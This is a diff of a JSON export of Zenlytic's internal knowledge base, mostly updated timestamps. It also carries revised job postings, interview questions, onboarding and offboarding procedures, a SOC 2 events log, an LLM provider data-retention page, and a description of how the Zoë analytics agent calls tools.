+      "lastUpdated": "2026-08-02T03:02:09.931Z"
     },
     {
       "id": "ab72611c-4387-40fe-8ab4-f7dcac850c91",
@@ -303,7 +307,7 @@
         "vendor",
         "subprocessor"
       ],
-      "lastUpdated": "2025-12-23T17:33:40.489Z"
+      "lastUpdated": "2026-08-02T03:02:10.785Z"
     },
     {
       "id": "54d40b58-4835-48be-be4d-087df35eed07",
@@ -323,7 +327,7 @@
         "aws",
         "vendor"
       ],
-      "lastUpdated": "2025-12-23T17:33:42.706Z"
+      "lastUpdated": "2026-08-02T03:02:11.597Z"
     },
     {
       "id": "25a4bff1-68be-46a4-a958-5eace6f86ac4",
@@ -343,7 +347,7 @@
         "aws",
         "monitoring"
       ],
-      "lastUpdated": "2025-12-23T17:33:43.508Z"
+      "lastUpdated": "2026-08-02T03:02:12.387Z"
     },
     {
       "id": "df929f14-2b7d-4188-93dd-979ceeee50f8",
@@ -360,7 +364,7 @@
         "procedure",
         "retention"
       ],
-      "lastUpdated": "2025-12-23T17:33:44.274Z"
+      "lastUpdated": "2026-08-02T03:02:13.177Z"
     },
     {
       "id": "21ea8dad-05ac-8094-a02d-e223590bc0b3",
@@ -379,7 +383,7 @@
         "retention",
         "vendor"
       ],
-      "lastUpdated": "2025-12-23T17:33:45.113Z"
+      "lastUpdated": "2026-08-02T03:02:13.969Z"
     },
     {
       "id": "129a8dad-05ac-801c-b803-e69297ecf8c7",
@@ -406,7 +410,7 @@
         "monitoring",
         "vendor"
       ],
-      "lastUpdated": "2025-12-23T17:33:47.111Z"
+      "lastUpdated": "2026-08-02T03:02:14.915Z"
     },
     {
       "id": "29ca8dad-05ac-80f3-9e55-cbb965b5b401",
@@ -420,7 +424,7 @@
         "rpo",
         "rto"
       ],
-      "lastUpdated": "2025-12-23T17:33:47.508Z"
+      "lastUpdated": "2026-08-02T03:02:15.409Z"
     },
     {
       "id": "71ba3e15-d5b5-4e62-a6f2-f3cb07983910",
@@ -430,7 +434,7 @@
       "keywords": [
         "CC1.4.1"
       ],
-      "lastUpdated": "2025-12-23T17:33:48.240Z"
+      "lastUpdated": "2026-08-02T03:02:16.363Z"
     },
     {
       "id": "e62f4f20-ea21-458b-a00f-b23295e468f6",
@@ -440,7 +444,7 @@
       "keywords": [
         "onboarding"
       ],
-      "lastUpdated": "2025-12-23T17:33:51.512Z"
+      "lastUpdated": "2026-08-02T03:02:16.953Z"
     },
     {
       "id": "257a8dad-05ac-807d-a16d-c40911e9b0a7",
@@ -451,7 +455,7 @@
         "onboarding",
         "api"
       ],
-      "lastUpdated": "2025-12-23T17:33:52.094Z"
+      "lastUpdated": "2026-08-02T03:02:17.654Z"
     },
     {
       "id": "e5dfcc09-a3ea-4180-99c6-136a6325f3aa",
@@ -459,7 +463,7 @@
       "parent": "CC1.4.1 Job Descriptions",
       "content": "## Job Overview\nZenlytic is an Intelligent Analytics company: we're building the human-first analytics experience.\nOur platform features a strong cognitive layer and a powerful chat agent, Zoë — our helpful assistant powered by large language models (LLMs). Zoë integrates deeply with our semantic layer to provide data insights with unparalleled accuracy to people of all backgrounds, from data analysts to company executives.\nWe’ve built out v1 of Zenlytic’s analytics platform — now we need someone to make it delightful, streamlined, and ridiculously good-looking for two very different types of users. Business leaders want simple, clear answers to big questions. Data analysts want powerful tools that let them dive deep into SQL and modeling. As our UI/UX Designer, you’ll take on the challenge of designing experiences that make both groups feel at home — crafting simplicity where it matters, and surfacing depth where it counts.\nYou’ll own the user experience end-to-end: from wireframes to polished visuals to building a design system that keeps everything cohesive. You’ll work side-by-side with our front-end team (they ship fast!) and help shape features that balance ease-of-use for executives with power and flexibility for analysts.\nIf you love the idea of turning complex workflows into intuitive, elegant experiences — and you get excited about designing for very different user needs in the same product — this is your spot.\n## What You’ll Do\n• Design experiences that work for two audiences: execs who want quick insights and analysts who need depth.\n• Collaborate with product + engineering to layer simplicity on top of powerful features.\n• Create flows, wireframes, prototypes, and polished visuals — including AI-driven chat interfaces for advanced analysis.\n• Build and maintain our design system in Figma for consistency across the product.\n• Run user research and testing with both personas, refining designs based on feedback.\n• Balance usability with flexibility — knowing when to streamline and when to expose advanced tools.\n• Stay sharp on UX best practices, accessibility, and design trends for data-heavy apps.\n## What You’ll Bring\n• A portfolio showing you can design for different users — simple for some, powerful for others.\n• Experience designing SaaS products (bonus if data-heavy or complex).\n• Proficiency in Figma.\n• Strong grasp of information hierarchy, usability, and user-centered design.\n• Comfort with research, design systems, and shipping fast in iterative environments.\n• Detail-oriented problem solver who thrives on ownership.\nBonus Points\n• Familiarity with front-end tech (HTML/CSS/JS).\n• Experience with analytics or BI tools.\n• Knowledge of accessibility and inclusive design.\n• +1 if you love data and analytics.\n• +10 if you’re awesome and fun to work with.\n## Additional Information\nZenlytic is a remote-first company. Team members are free to work from anywhere in the United States. For those who prefer an office environment, we maintain an office in Midtown Manhattan that is available for use.\nVisa Sponsorship: U.S. citizens and those authorized to work in the U.S. are encouraged to apply. Please note that this position is not eligible for visa sponsorship.\nZenlytic is an equal opportunity employer. All qualified applicants will receive consideration for employment regardless of race, color, religion, sex, sexual orientation, gender identity, national origin, disability, or veteran status.",
       "keywords": [],
-      "lastUpdated": "2025-12-23T17:33:52.786Z"
+      "lastUpdated": "2026-08-02T03:02:18.370Z"
     },
     {
       "id": "1e04744c-8d19-4654-b475-0d61ccd115db",
@@ -472,7 +476,7 @@
         "aws",
         "api"
       ],
-      "lastUpdated": "2025-12-23T17:33:53.401Z"
+      "lastUpdated": "2026-08-02T03:02:19.097Z"
     },
     {
       "id": "6e1afd79-40ea-424e-a505-0a02de0c2fbd",
@@ -487,7 +491,7 @@
         "monitoring",
         "api"
       ],
-      "lastUpdated": "2025-12-23T17:33:54.269Z"
+      "lastUpdated": "2026-08-02T03:02:19.852Z"
     },
     {
       "id": "643242aa-ba5f-485a-a9ac-93632f14fcb1",
@@ -500,7 +504,7 @@
         "monitoring",
         "api"
       ],
-      "lastUpdated": "2025-12-23T17:33:54.975Z"
+      "lastUpdated": "2026-08-02T03:02:20.544Z"
     },
     {
       "id": "0eb67d56-4e2d-4f6b-813a-4211173efc76",
@@ -512,7 +516,7 @@
         "infrastructure",
         "api"
       ],
-      "lastUpdated": "2025-12-23T17:33:55.595Z"
+      "lastUpdated": "2026-08-02T03:02:21.265Z"
     },
     {
       "id": "1d1a8dad-05ac-8062-b9b7-d58d407e3574",
@@ -525,7 +529,7 @@
         "infrastructure",
         "monitoring"
       ],
-      "lastUpdated": "2025-12-23T17:33:56.233Z"
+      "lastUpdated": "2026-08-02T03:02:23.120Z"
     },
     {
       "id": "25da8dad-05ac-8001-bfe8-ff19bb0aa0bc",
@@ -533,7 +537,7 @@
       "parent": "CC1.4.1 Job Descriptions",
       "content": "## Job Overview\nZenlytic is an Intelligent Analytics company: we're building the human-first analytics experience.\nOur platform features a strong cognitive layer and a powerful chat agent, Zoë — our helpful assistant powered by large language models (LLMs). Zoë integrates deeply with our semantic layer to provide data insights with unparalleled accuracy to people of all backgrounds, from data analysts to company executives.\nWe’re looking for a Software Engineering Intern to develop benchmarks on the performance of LLMs. You will take ownership of the design, implementation, and testing of a system that evaluates how well LLMs convert user input into SQL. You will publish your findings and integrate the code into our existing software repository for general usage.\nThe LLM space is one of the fastest-moving and most exciting frontiers in tech today—and we’re building at that pace. This role is ideal for someone who thrives in high-ownership environments, enjoys both strategic thinking and hands-on coding, and wants to deliver cutting-edge product experiences at the intersection of AI and analytics.\n## What You’ll Do\n• Design and implement an LLM evaluation test suite\n• Measure the performance of several LLMs against the test suite\n## What You’ll Bring\n• Familiarity with LLMs, NLP, and ML concepts (e.g., retrieval-augmented generation, embedding search, agent frameworks).\n• Deep experience with Git, pull requests, and modern collaboration workflows.\n• A self-driven mindset, with the ability to own multiple initiatives simultaneously.\n## Additional Information\nZenlytic is a remote-first company. Team members are free to work from anywhere in the United States. For those who prefer an office environment, we maintain an office in Midtown Manhattan that is available for use.\nVisa Sponsorship: U.S. citizens and those authorized to work in the U.S. are encouraged to apply. Please note that this position is not eligible for visa sponsorship.\nZenlytic is an equal opportunity employer. All qualified applicants will receive consideration for employment regardless of race, color, religion, sex, sexual orientation, gender identity, national origin, disability, or veteran status.",
       "keywords": [],
-      "lastUpdated": "2025-12-23T17:33:56.790Z"
+      "lastUpdated": "2026-08-02T03:02:23.854Z"
     },
     {
       "id": "5fbb2322-5e1e-4511-bc93-4df61c309cdf",
@@ -541,7 +545,7 @@
       "parent": "CC1.4.1 Job Descriptions",
       "content": "",
       "keywords": [],
-      "lastUpdated": "2025-12-23T17:33:57.339Z"
+      "lastUpdated": "2026-08-02T03:02:24.437Z"
     },
     {
       "id": "c4dcf450-e0e8-44b9-a40f-f0c13f33f4be",
@@ -551,7 +555,7 @@
       "keywords": [
         "api"
       ],
-      "lastUpdated": "2025-12-23T17:33:58.978Z"
+      "lastUpdated": "2026-08-02T03:02:24.959Z"
     },
     {
       "id": "4cd88e19-4ea2-4549-bab4-974bb12ccd96",
@@ -559,7 +563,7 @@
       "parent": "Growth Lead",
       "content": "• Product-first, bottom-up sales motions: \n• Strong community-based marketing:\n• Content-marketing leaders\n• Leading Shopify technology providers:",
       "keywords": [],
-      "lastUpdated": "2025-12-23T17:33:59.565Z"
+      "lastUpdated": "2026-08-02T03:02:25.619Z"
     },
     {
       "id": "df6e0b27-3198-42d9-8664-af317ec8bd79",
@@ -567,7 +571,7 @@
       "parent": "Growth Lead",
       "content": "---\n• 10/14/20\n• Jonathan Beaton\n---\n## GTM \n• What are you planning for our GTM? What directions would you take us?\n• Most of his experience was with organic motion ",
       "keywords": [],
-      "lastUpdated": "2025-12-23T17:34:00.076Z"
+      "lastUpdated": "2026-08-02T03:02:26.191Z"
     },
     {
       "id": "5cfbb722-dd2b-4552-a259-ea50453cbd69",
@@ -575,7 +579,7 @@
       "parent": "Growth Lead",
       "content": "---\n## Meeting with Viral (8/5/2020)\n• He's the CFO, co-founder\n• He does ops and systems + low code tools \n• They're in growth stage and starting to focus on data\n• historically bringing data into gsheets and now on tableau\n• sync all data in tableau and report there \n---\n## Meeting with Alex (9/25/20)\n• No one person will fit all our needs \n• She'll send us a deck with their model and setup\n• We send them requirements and they'll match us \n• Hourly is $90-170 / hr except for CMO which is higher \n• Part time is locked in 20 hours a week, FT is 40% \n• 20% discount off rate for Part time and Full time ",
       "keywords": [],
-      "lastUpdated": "2025-12-23T17:34:03.158Z"
+      "lastUpdated": "2026-08-02T03:02:26.776Z"
     },
     {
       "id": "09030d3d-835d-42bc-9724-86d0a968e7de",
@@ -583,7 +587,7 @@
       "parent": "Growth Lead",
       "content": "- What would you do to launch Zenlytic?\nuse U-link to reach out\n- What do you think of the PLG model?\n- What's a marketing-driven company you respect?  How would you explain their marketing strategy?\n- How do you keep up with the industry?  What's your favorite email newsletter?\n- What are the most important components of an inbound strategy?\n- How have you used data before in your job?  What tools have you used?\n- What do you do for fun outside of work?\n- What brands or influencers do you follow on social media and why?",
       "keywords": [],
-      "lastUpdated": "2025-12-23T17:34:05.463Z"
+      "lastUpdated": "2026-08-02T03:02:27.412Z"
     },
     {
       "id": "c2fec5dc-b6b6-4ec1-b9b5-c3c312b32439",
@@ -591,7 +595,7 @@
       "parent": "Growth Lead",
       "content": "- What would you do to launch Zenlytic?\n- What do you think of the PLG model?\n- What's a marketing-driven company you respect?  How would you explain their marketing strategy?\n- How do you keep up with the industry?  What's your favorite email newsletter?\n- What are the most important components of an inbound strategy?\n- How have you used data before in your job?  What tools have you used?\n- What do you do for fun outside of work?\n- What brands or influencers do you follow on social media and why?",
       "keywords": [],
-      "lastUpdated": "2025-12-23T17:34:08.114Z"
+      "lastUpdated": "2026-08-02T03:02:28.115Z"
     },
     {
       "id": "ef147748-77aa-4049-92ec-d8d5978bc0d1",
@@ -604,7 +608,7 @@
         "aws",
         "api"
       ],
-      "lastUpdated": "2025-12-23T17:34:08.865Z"
+      "lastUpdated": "2026-08-02T03:02:28.964Z"
     },
     {
       "id": "1b4a8dad-05ac-8032-b5ce-c63f100dcabe",
@@ -614,7 +618,7 @@
       "keywords": [
         "infrastructure"
       ],
-      "lastUpdated": "2025-12-23T17:34:09.530Z"
+      "lastUpdated": "2026-08-02T03:02:31.203Z"
     },
     {
       "id": "add41806-bd72-4418-835a-d7a337fc0b36",
@@ -624,7 +628,7 @@
       "keywords": [
         "retention"
       ],
-      "lastUpdated": "2025-12-23T17:34:10.378Z"
+      "lastUpdated": "2026-08-02T03:02:31.891Z"
     },
     {
       "id": "1195ed70-a8b2-47cf-a34d-5894f200e66e",
@@ -635,7 +639,7 @@
         "rpo",
         "network"
       ],
-      "lastUpdated": "2025-12-23T17:34:10.965Z"
+      "lastUpdated": "2026-08-02T03:02:32.637Z"
     },
     {
       "id": "92da9569-6340-4865-be2a-7677164c5d1c",
@@ -646,7 +650,7 @@
         "onboarding",
         "api"
       ],
-      "lastUpdated": "2025-12-23T17:34:11.648Z"
+      "lastUpdated": "2026-08-02T03:02:33.502Z"
     },
     {
       "id": "1eaa8dad-05ac-80d0-9b92-c2ba45a52272",
@@ -660,7 +664,7 @@
         "vendor",
         "api"
       ],
-      "lastUpdated": "2025-12-23T17:34:13.381Z"
+      "lastUpdated": "2026-08-02T03:02:34.161Z"
     },
     {
       "id": "25ba8dad-05ac-801b-9928-e40a3d182470",
@@ -668,7 +672,7 @@
       "parent": "CC1.4.1 Job Descriptions",
       "content": "- What product or feature have you built from scratch that you're most proud of? \n- What product or feature have you worked on with the most demanding performance, scalability, latency, or memory requirements? Please describe these requirements.\n- What is the most complex application you've ever worked on? What specific factors made it complex?\n- Describe a technically challenging problem you solved that surprised you. Was it unexpectedly difficult or simple? Did you develop an elegant solution? Or did you build a very convoluted solution and later realized that there was a much simpler solution.",
       "keywords": [],
-      "lastUpdated": "2025-12-23T17:34:17.085Z"
+      "lastUpdated": "2026-08-02T03:02:34.742Z"
     },
     {
       "id": "1d0a8dad-05ac-80af-89e7-e100d0956aae",
@@ -678,7 +682,7 @@
       "keywords": [
         "api"
       ],
-      "lastUpdated": "2025-12-23T17:34:17.519Z"
+      "lastUpdated": "2026-08-02T03:02:35.297Z"
     },
     {
       "id": "1d1a8dad-05ac-807a-b46f-f343f6f4c20f",
@@ -688,7 +692,7 @@
       "keywords": [
         "infrastructure"
       ],
-      "lastUpdated": "2025-12-23T17:34:18.047Z"
+      "lastUpdated": "2026-08-02T03:02:35.830Z"
     },
     {
       "id": "1d1a8dad-05ac-80a8-8389-c938d2709bb8",
@@ -696,7 +700,7 @@
       "parent": "CC1.4.1 Job Descriptions",
       "content": "- Please describe the product or major feature that you are most proud of being the driving force behind.\n- What SaaS product out there do you think offers the most incredible user experience? What about it inspires you?\n- What do you think is the biggest thing that ChatGPT’s interface gets wrong?",
       "keywords": [],
-      "lastUpdated": "2025-12-23T17:34:18.566Z"
+      "lastUpdated": "2026-08-02T03:02:36.389Z"
     },
     {
       "id": "2aef0fb0-71ef-4ba9-806b-881051c8c20a",
@@ -707,7 +711,7 @@
         "employee",
         "policy"
       ],
-      "lastUpdated": "2025-12-23T17:34:19.238Z"
+      "lastUpdated": "2026-08-02T03:02:37.163Z"
     },
     {
       "id": "c63ab33c-0bc4-4aa9-98f3-fa81d7100850",
@@ -719,13 +723,13 @@
         "sso",
         "aws"
       ],
-      "lastUpdated": "2025-12-23T17:34:19.616Z"
+      "lastUpdated": "2026-08-02T03:02:37.616Z"
     },
     {
       "id": "a35e336a-5a92-4fba-9ac4-8a75d7872412",
       "title": "Employee Onboarding Process",
       "parent": "Employee Handbook",
-      "content": "All employees who will touch customer data need to receive the email about reading and acknowledging our security and governance policies. ⚠️Please send it once the user has their Zenlytic email and has access to Notion.\n---\n# All Employees\n- Resume: (we need to have a PDF of the employee’s resume)\n- Rippling Onboarding: Initiate the Rippling onboarding process, include a background check, and leave the PIIA, Offer Letter, and NDA included in selected documents.\n\n- Security Training: If Rippling does not automatically enroll the user in cybersecurity training, send them this document and ask them to respond by email once they’ve gone through it.\n\n- SaaS Product Access:\n- Meetings: Add the user to the appropriate meetings (e.g. Zenlytics All Hands, etc.)\n- Google Workspace: Add the user to the appropriate Google Group (once we’re beyond the Starter Package with Google Workspace)\n- Access request: Send an email from Paul or Ryan to the other stating which systems the person has access to and requesting approval for that access. Note: this is only relevant for systems that access customer data (lettersi-m above).\n\n- Verizon Specialized Training: Will they touch Verizon data in any way? If so, you must send them the Verizon CPNI training found in this document (send it in email and cc Paul, so we have a record, if audited) Verizon CPNI training \n- Document Acknowledgements:\n- Supplemental Documents for Contractors:\n- Reading:\n- SOC 2 Logging:\n---\n# Department-Specific Employee Onboarding Steps\n### Engineering\n- Grant access to engineering-specific SaaS products\n- Email lists\n### Sales\n- Grant access to Fireflies\n---\n# Employee Offboarding Steps\n• Deactivate email on Google\n• Release from ABM, remove device management from Kandji portal (MDM)\n• Deactivate their various accounts (Notion, Slack, Gong, Logrocket, Langfuse, Figma, Linear, Zoom, ChatGPT, Hubspot, Intercom, Sentry, Github, Zenlytic, Claude, AWS) freeing up licenses\n• If they had AWS admin:\n• If they had prod DB access, rotate prod DB creds\n• Get laptop shipped back to Paul\n• Remove them from recurring meetings (not critical since email is deactivated, but it’s cleaner)\n• Update the SOC 2 Events Log with screenshots of essential steps taken",
+      "content": "All employees who will touch customer data need to receive the email about reading and acknowledging our security and governance policies. ⚠️Please send it once the user has their Zenlytic email and has access to Notion.\n---\n# All Employees\n- Resume: (we need to have a PDF of the employee’s resume)\n- Rippling Onboarding: Initiate the Rippling onboarding process, include a background check, and leave the PIIA, Offer Letter, and NDA included in selected documents.\n\n- Security Training: If Rippling does not automatically enroll the user in cybersecurity training, send them this document and ask them to respond by email once they’ve gone through it. If they’re a contractor, send them this training instead\n\n- SaaS Product Access:\n- Meetings: Add the user to the appropriate meetings (e.g. Zenlytics All Hands, etc.)\n- Google Workspace: Add the user to the appropriate Google Group (once we’re beyond the Starter Package with Google Workspace)\n- Access request: Send an email from Paul or Ryan to the other stating which systems the person has access to and requesting approval for that access. Note: this is only relevant for systems that access customer data (lettersi-m above).\n\n- Verizon Specialized Training: Will they touch Verizon data in any way? If so, you must send them the Verizon CPNI training found in this document (send it in email and cc Paul, so we have a record, if audited) Verizon CPNI training \n- Document Acknowledgements:\n- Supplemental Documents for Contractors:\n- Reading:\n- SOC 2 Logging:\n---\n# Department-Specific Employee Onboarding Steps\n### Engineering\n- Grant access to engineering-specific SaaS products\n- Email lists\n### Sales\n- Grant access to Fireflies\n---\n# Employee Offboarding Steps\n• Deactivate email on Google\n• Release from ABM, remove device management from Kandji portal (MDM)\n• Deactivate their various accounts (Notion, Slack, Gong, Logrocket, Langfuse, Figma, Linear, Zoom, ChatGPT, Hubspot, Intercom, Sentry, Github, Zenlytic, Claude, AWS) freeing up licenses\n• If they had AWS admin:\n• If they had prod DB access, rotate prod DB creds\n• Get laptop shipped back to Paul\n• Remove them from recurring meetings (not critical since email is deactivated, but it’s cleaner)\n• Update the SOC 2 Events Log with screenshots of essential steps taken",
       "keywords": [
         "soc 2",
         "training",
@@ -738,7 +742,7 @@
         "aws",
         "logging"
       ],
-      "lastUpdated": "2025-12-23T17:34:20.436Z"
+      "lastUpdated": "2026-08-02T03:02:38.547Z"
     },
     {
       "id": "1325e189-2105-452d-b6f3-68f3b197ccf1",
@@ -751,7 +755,7 @@
         "onboarding",
         "aws"
       ],
-      "lastUpdated": "2025-12-23T17:34:20.834Z"
+      "lastUpdated": "2026-08-02T03:02:39.256Z"
     },
     {
       "id": "ac94c667-0af3-4bad-a023-ba0ce979ebff",
@@ -767,7 +771,7 @@
         "aws",
         "third party"
       ],
-      "lastUpdated": "2025-12-23T17:34:22.390Z"
+      "lastUpdated": "2026-08-02T03:02:40.558Z"
     },
     {
       "id": "1595fdb6-a46a-482e-9dcc-65fd98831020",
@@ -779,7 +783,7 @@
         "compliance",
         "audit"
       ],
-      "lastUpdated": "2025-12-23T17:34:22.881Z"
+      "lastUpdated": "2026-08-02T03:02:41.458Z"
     },
     {
       "id": "8230df19-ee1e-4f6f-b0c1-00518e41d5bb",
@@ -812,7 +816,7 @@
         "monitoring",
         "vendor"
       ],
-      "lastUpdated": "2025-12-23T17:34:23.553Z"
+      "lastUpdated": "2026-08-02T03:02:42.353Z"
     },
     {
       "id": "25ca8dad-05ac-80d9-a716-c2461db6a795",
@@ -825,25 +829,28 @@
         "incident",
         "onboarding"
       ],
-      "lastUpdated": "2025-12-23T17:34:24.238Z"
+      "lastUpdated": "2026-08-02T03:02:43.197Z"
     },
     {
       "id": "25ca8dad-05ac-805b-85a7-f7269be86e66",
       "title": "SOC 2 Events Log",
       "parent": "SOC2 Event Types",
-      "content": "---\n• June 16, 2025: Employee Onboarding: Djordje Ivanovic\n---\n• July 16, 2025: Employee Departure: Rich Taylor\n---\n• July 28, 2025: Employee Onboarding: Jose Luiz Hernandez Hoyos\n---\n• August 29, 2025: Employee Termination: Aaron Cornejo\n• August 29, 2025: Employee Termination: Tyler Crimmins\n---\n• August 29, 2025: Employee Offboarding: Djordje Ivanovic\n• September 26, 2024: Employee Offboarding: Cole French\n---\n• October 2, 2025: Employee Onboarding: Sebastian Castro",
+      "content": "---\n• June 16, 2025: Employee Onboarding: Djordje Ivanovic\n---\n• July 16, 2025: Employee Departure: Rich Taylor\n---\n• July 28, 2025: Employee Onboarding: Jose Luiz Hernandez Hoyos\n---\n• August 29, 2025: Employee Termination: Aaron Cornejo\n• August 29, 2025: Employee Termination: Tyler Crimmins\n---\n• August 29, 2025: Employee Offboarding: Djordje Ivanovic\n• September 26, 2024: Employee Offboarding: Cole French\n---\n• October 2, 2025: Employee Onboarding: Sebastian Castro\n---\n• November 24, 2025: Downgrade privileged access for John when it is no longer needed (linear ticket)\n---\n• January 6, 2026: Employee Departure: Zach Wright\n---\n• March 25, 2026: AWS Security Training Completed for Jose Hernandez and Sebastian Castro\n---\n• April 1, 2026: Employee Departure: Mark Stephen\n• April 30, 2026: Employee Departure: Michael McFarlane\n---\n• June 2, 2026: Employee Departure: Anshu Aggarwal\n---\n• Noah Fidel joins \n• \n---\n• <>",
       "keywords": [
         "soc 2",
+        "training",
+        "security",
         "employee",
-        "onboarding"
+        "onboarding",
+        "aws"
       ],
-      "lastUpdated": "2025-12-23T17:34:24.528Z"
+      "lastUpdated": "2026-08-02T03:02:43.702Z"
     },
     {
       "id": "6b8833be227a437a8f846f9cd5c896e4",
       "title": "Security Homepage",
       "parent": "root",
-      "content": "These are the key docs for our security policies \n## Data Retention\n## Legal\n## Security External Documents\n• Security and Compliance \n• SOC2 \n• Penetration Testing \n# Legal for Website\n## Architecture Diagrams\n• Clarity Engine Diagram\n• Network Diagram\n• Agent Flow Diagram (Figma link)\n# Completed Security Docs (for future reference)\n## FAQ",
+      "content": "These are the key docs for our security policies \n## Data Retention\n## Insurance\n## Legal\n## Security External Documents\n• Security and Compliance \n• SOC2 \n• Penetration Testing \n# Legal for Website\n## Architecture Diagrams\n• Clarity Engine Diagram\n• Network Diagram\n• Agent Flow Diagram (Figma link)\nExploratory mode diagram \n# Completed Security Docs (for future reference)\n## FAQ",
       "keywords": [
         "soc2",
         "security",
@@ -852,7 +859,7 @@
         "retention",
         "network"
       ],
-      "lastUpdated": "2025-12-23T17:34:25.384Z"
+      "lastUpdated": "2026-08-02T03:02:44.797Z"
     },
     {
       "id": "3eb14fe0-7e8d-400f-8082-a5af44c29a0a",
@@ -869,7 +876,20 @@
         "logging",
         "monitoring"
       ],
-      "lastUpdated": "2025-12-23T17:34:27.757Z"
+      "lastUpdated": "2026-08-02T03:02:45.288Z"
+    },
+    {
+      "id": "36fa8dad-05ac-81a7-85a6-cfb6090cbcb4",
+      "title": "LLM Provider Data Retention Periods",
+      "parent": "Security Homepage",
+      "content": "Ex Quanta Inc (d.b.a Zenlytic)\nPolicy Owner: Paul Blankley\nStatus: Implemented\n## Overview\nThis document outlines the attested log retention periods for the LLM providers supported by Zenlytic. Agreements are in place with all providers. It is a companion to the broader Data Retention Policies page, which covers retention across the rest of the application (CloudWatch, Sentry, Langfuse, etc).\n## Retention by Provider\n## Additional Notes\n• No training use: Data is never used for training with any of the models or providers Zenlytic supports.\n• Self-hosted option: Zenlytic supports routing traffic to your own internal LLM instances if you prefer end-to-end control over the entire logging process.",
+      "keywords": [
+        "training",
+        "policy",
+        "retention",
+        "logging"
+      ],
+      "lastUpdated": "2026-08-02T03:02:45.881Z"
     },
     {
       "id": "fd9bdf97-ab8c-4543-8810-2a70c312458c",
@@ -880,7 +900,7 @@
         "privacy",
         "policy"
       ],
-      "lastUpdated": "2025-12-23T17:34:31.916Z"
+      "lastUpdated": "2026-08-02T03:02:46.428Z"
     },
     {
       "id": "482e1430-de5b-4c9f-8788-f3dce778af63",
@@ -888,7 +908,7 @@
       "parent": "Security Homepage",
       "content": "This is the link to our EULA / ToS ",
       "keywords": [],
-      "lastUpdated": "2025-12-23T17:34:33.078Z"
+      "lastUpdated": "2026-08-02T03:02:47.123Z"
     },
     {
       "id": "028b3458-f905-4410-91db-39db87ff955f",
@@ -899,7 +919,7 @@
         "sso",
         "subprocessor"
       ],
-      "lastUpdated": "2025-12-23T17:34:33.605Z"
+      "lastUpdated": "2026-08-02T03:02:47.707Z"
     },
     {
       "id": "216a8dad-05ac-8053-86f9-f85f9cdf8363",
@@ -907,15 +927,18 @@
       "parent": "Security Homepage",
       "content": "",
       "keywords": [],
-      "lastUpdated": "2025-12-23T17:34:34.826Z"
+      "lastUpdated": "2026-08-02T03:02:48.271Z"
     },
     {
       "id": "180a8dad-05ac-80a1-bccf-da1558df31ed",
       "title": "Zoë Architecture",
       "parent": "Security Homepage",
-      "content": "Zoë operates with an Agentic architecture. This means that at each step of the question-answering process, the LLM chooses between calling a tool in its set of tools or responding directly to the user. \nIf the LLM chooses to call a tool, Zenlytic will run the tool and show the results to the LLM. The LLM will then make a decision on whether it wants to call another tool or respond directly to the user. This process continues until the LLM responds directly to the user.\nA high-level diagram of this workflow looks like this:\n## Question Answering Process\nTo be more specific on the set of tools that Zoë uses and when she uses them, let’s look at a more complicated question flow that involves a wider range of tools used. \n- User asks a question “Can you show me gross revenue by product YTD and tell me which product had the highest growth from last YTD to this YTD?”\n- Zoë passes that question to the LLM which determines it wants to use the search fields tool. It queries the search fields tool with the search terms “gross revenue”, “ytd”, “product”.\n- Zoë executes the tool itself, and returns matching fields like order_lines.total_gross_revenue, order_lines.order_date, and products.product_title, along with their additional metadata and SQL definitions.\n- Zoë structures the SQL she wants to use from the metadata into a tool call to the LLM, and the LLM determines that it wants to use the run a query tool. It calls the run a query tool with SQL referencing the field definitions that it saw in the search fields tool response.\n- Zoë compiles the arguments the LLM passes into SQL using the Clarity Engine, and executes that SQL query on the customer’s warehouse.\n- Zoë passes the result of the tool call (the data from the query run on the warehouse) to the LLM and the LLM determines that it wants to use the code interpreter tool to calculate the percentage change from last YTD  to this YTD. The LLM writes the code it wants to execute on top of the query results it sees.\n- Zoë executes the code it received as part of the tool call for code interpreter in an isolated sandbox environment. \n- Zoë passes the result of the code interpreter execution to the LLM, and the LLM determines it wants to respond to the user directly and end the iteration process. The LLM responds with text summarizing the results of the conversation thus far.\n- Zoë passes that summarization to the user (including the previously used tool calls and results), answering their question. \nAnother helpful visual, which doesn’t contain all LLM calls made in the process outlined above, but shows all the unique services used, and how they fit together:",
-      "keywords": [],
-      "lastUpdated": "2025-12-23T17:34:35.345Z"
+      "content": "Zoë answers data questions by writing and running SQL against your warehouse in real time. But every query is grounded in governed, verified field definitions rather than free-form generation, so answers stay accurate and auditable. She can also create rich documents (Word, Excel, PowerPoint) and interactive dashboard experiences using the data she pulls.\nZoë operates with an agentic architecture. This means that at each step of the question-answering process, she chooses between calling a tool from her tool set and responding directly to the user. \nIf Zoë chooses to call a tool, Zenlytic will run the tool and show the results to her. She will then make a decision on whether she wants to call another tool or respond directly to the user. This process continues until she responds directly to the user.\nA high-level diagram of this workflow looks like this:\n## Question Answering Process\nTo be more specific on the set of tools that Zoë uses and when she uses them, let’s look at a more complicated question flow that involves a wider range of tools used. \n- User asks a question “Can you show me gross revenue by product YTD and tell me which product had the highest growth from last YTD to this YTD?”\n- Zoë ingests that question and determines she wants to use the search fields tool. She queries the search fields tool with the search terms “gross revenue”, “ytd”, “product”.\n- The tool executes, and returns matching fields like order_lines.total_gross_revenue, order_lines.order_date, and products.product_title, along with their additional metadata and SQL definitions.\n- Zoë structures the SQL she wants to use from the metadata she sees from those results into a tool call (the sql query tool). She calls the sql query tool with SQL referencing the field definitions that she saw in the search fields tool response.\n- The SQL Zoë passed into the tool is checked for permissions and de-compiled using the Clarity Engine to provide an easy-to-verify UI business people can use to see the approach she took, and is then executed on the customer’s data warehouse.\n- Zoë sees the result of the tool call (a preview of the data from the query run on the warehouse) and determines that she wants to use the code interpreter tool to visualize the data using an interactive javascript dashboard.. She writes the code she wants to execute on top of the query results she sees and passes it to the tool.\n- The tool executes the code it received as part of the tool call for code interpreter in an isolated sandbox environment, which allows Zoë to build the rich outputs she produces. \n- Zoë sees the result of the code interpreter execution determines she is done and wants to respond to the user directly and end the iteration process. She responds with text summarizing the results of the conversation thus far.",
+      "keywords": [
+        "audit",
+        "rpo"
+      ],
+      "lastUpdated": "2026-08-02T03:02:49.347Z"
     },
     {
       "id": "a64dc864-7a02-468c-85f4-6c91bb6fc122",
@@ -923,7 +946,7 @@
       "parent": "Security Homepage",
       "content": "# Without Clarity (link)\n# With Clarity (link)\n# With Clarity - Deep questions (link)",
       "keywords": [],
-      "lastUpdated": "2025-12-23T17:34:35.941Z"
+      "lastUpdated": "2026-08-02T03:02:49.982Z"
     },
     {
       "id": "b1172bf4-7337-4ac6-8996-593a99253586",
@@ -939,18 +962,28 @@
         "policy",
